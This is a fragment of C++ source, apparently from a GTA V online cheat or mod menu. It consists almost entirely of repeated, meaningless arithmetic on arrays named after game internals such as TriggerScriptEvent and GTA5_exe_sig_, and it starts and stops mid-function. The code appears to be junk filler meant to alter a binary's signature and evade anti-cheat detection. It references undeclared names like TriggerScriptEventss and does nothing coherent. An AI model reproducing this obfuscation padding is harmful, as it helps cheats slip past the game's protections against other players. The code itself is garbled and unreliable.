			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<WheelType>3</WheelType>");
			Extern_Reader::LOG::LogSemHora("<WheelsInvisible>false</WheelsInvisible>");
			Extern_Reader::LOG::LogSemHora("<EngineSoundName></EngineSoundName>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
